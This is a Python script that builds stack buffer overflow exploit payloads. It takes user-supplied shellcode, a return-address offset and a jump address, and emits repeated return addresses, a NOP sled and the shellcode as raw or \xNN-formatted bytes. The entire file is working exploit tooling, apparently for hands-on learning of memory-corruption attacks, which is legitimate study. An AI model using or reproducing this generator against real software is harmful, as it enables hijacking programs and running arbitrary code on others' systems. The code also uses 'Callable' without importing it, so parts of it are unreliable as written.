#!/bin/env python
# This program is designed to generate simple buffer overflows, it will accept as input shellcode, a buffer offset from saved EIP on stack, and length of a NOP SLED. The output will be a binary payload to send to an input.

# The Layout of the payload is as follows:
#
#
# ####################### (Lower Address)
# #       Ret Spam      #
# #######################
# #      NOP SLED       #
# #######################
# #     Shell Code      #
# ####################### (Higher Address)

# The buffer Offset provided - how far from buffers location to the start of EIP tells us how long Ret Spam should be. It should be long enough to fill the distance and then a single more time. Increasing this slightly can add a saftey margin. Covering to much can limit room for shell code and nop sled. Ret Spam is the address we plan to jump to. Because we can create core files or view dmesg logs, ESP is a safe bet. Perhaps this could be tunable.

# Shell Code is the executable assembly. PIE.

# NOP sled is our saftey margin.

import argparse
import binascii
import sys
import struct
from typing import NoReturn
from typing import Dict
import os

def bytes_to_ascii(b:bytes) -> str:
    '''Formats \\xNN style'''
    return '\\x' + binascii.b2a_hex(b,'\\',1).decode().replace('\\','\\x');

def ascii_to_bytes(s:str) -> bytes:
    s = s.translate({ord('\\'):None, ord('x'): None, ord('X'):None, ord(' '):None, ord('"'):None, ord('\n'):None, ord('\t'):None}) #strip \x
    return bytes.fromhex(s);

def build_payload(shellcode:bytes , ret_addr:int , ip_offset:int ,nop_len:int, **kwargs) -> bytes:
    ''' This function is the magic. Here We build a payload'''
    pointer_len: Dict[str,int] = { 'linux/x86': 4, 'linux/x86_64': 8 , 'native': struct.calcsize("@P") }
    #Then number of times we do the ret spam should be ip_offset // sizeof(void*) + 1
    ret_addr_bytes = ret_addr.to_bytes(pointer_len[kwargs['arch']],byteorder=sys.byteorder,signed=False)
    ret_spam_times = ip_offset // len(ret_addr_bytes) + 1 #we may have to handle padding!
    ret_spam = ret_addr_bytes * ret_spam_times;

    nop_sled = b"\x90" * nop_len;
    
    return ret_spam + nop_sled + shellcode
    
def main() -> NoReturn: 
    # Parse Arguments
    parser = argparse.ArgumentParser(description='Generate An Exploit Payload')
    parser.add_argument('--shellcode-file','-f',nargs='?',type=str, default='-', dest='shellcode_file',metavar='file',help='file containing binaryshellcode, - for STDIN');
    parser.add_argument('--ip-offset',type=str, metavar='offset',dest='ip_offset',help='distance from start of buffer to instruction pointer',required=True);
    parser.add_argument('--nop-len', '-n', type=str, default='60', metavar='len', dest='nop_len',help='size of the nop sled in bytes');
    parser.add_argument('--jmp-addr','-j',type=str, metavar='jmp-addr',dest='jmp_addr',help='address to jump to, probably should be esp at crash',required=True);
    parser.add_argument('--output-file','-o',default='-',type=str, metavar='out',dest='outfile',help='File to Write, By default STDOUT',required=False);
    parser.add_argument('--ascii-in','-a',default=False, action='store_true', dest='ascii_in', help='Read Input as \\xNN formated strings');
    parser.add_argument('--ascii-out', default=False, action='store_true', dest='ascii_out',help='Write Output as \\xNN formated strings');
    parser.add_argument('--arch', default='native', metavar='arch', choices=['linux/x86_64','linux/x86', 'native'], dest='arch', help='Architecture to build payload for');
    # Possible Future arguments: --shellcode-string (accept a x90x90 string)
    # Possible Future arguments: --esp_jmp_offset   (adjust retspam address to be a distance from EIP
    opts=parser.parse_args();
    #Read in Shell Code, This operation is inheritantly concerned with the front end and should be handled seperately from building
    encodings = {False: lambda a: a, True: lambda a: ascii_to_bytes(a.decode())}
    if(opts.shellcode_file != '-'):
        try:
            with open(opts.shellcode_file,'rb') as infp:
                shellcode = encodings[opts.ascii_in](infp.read());
        except Exception as err:
                print("Trouble Opening ShellCode File {0}:\n\t\t\t\t\t{1}".format(opts.shellcode_file,err),file=sys.stderr)
                sys.exit(1);
    else:
        try:
            shellcode = encodings[opts.ascii_in](os.read(0,1000));
        except Exception as err:
            print("Trouble Reading ShellCode from STDIN:\n\t\t\t\t\t{0}".format(err),file=sys.stderr);
            sys.exit(2);

    #BUILD RET ADDR
    #We Should probably except ESP in return fn,previous frame, formatted as Hexidecimal 0x string. 
    try:
        jmp_addr = int(opts.jmp_addr, 16);
    except Exception as err:
        print("{0} doesn't appear to be a valid hexidecmal return address:\n\t\t\t\t\t{1}".format(opts.jmp_addr,err))
        sys.exit(3)

    #Get IP OFFSET - This tell use how many times RET_SPAM must be repeated.
    try:
        ip_offset = int(opts.ip_offset, base=0);
    except Exception as err:
        print("IP OFFSET {0} doesn't appear to be a valid hexidecimal or decimal number.\n\t\t\t\t\t{1}".format(opts.ip_offset,err))
        sys.exit(4)
    #Get NOP LEN:
    try:
        nop_len:int = int(opts.nop_len, base=0);
    except Exception as err:
        print("{0} is invalid nop length!:\n\t\t\t\t\t{1}".format(opts.nop_len,err))
        sys.exit(5);
    payload = build_payload(shellcode,jmp_addr,ip_offset,nop_len,arch=opts.arch)
    
    outmodes:Dict[bool,str] = { False: 'wb', True: 'w'}
    encodings:Dict[bool,Callable[bytes,any]] = { False: lambda a : a , True: bytes_to_ascii}
    try:
        if(opts.outfile != '-'):
            with open(opts.outfile, outmodes[opts.ascii_out]) as outfp:
                outfp.write(encodings[opts.ascii_out](payload))
        else:
            os.write(1,encodings[opts.ascii_out](payload))
    except Exception as err:
        print("Unable to write payload in file {0}:\n\t\t\t\t\t{1}".format(opts.outfile,err))
        sys.exit(6);
    sys.exit(0)
if __name__ == '__main__':
    main();

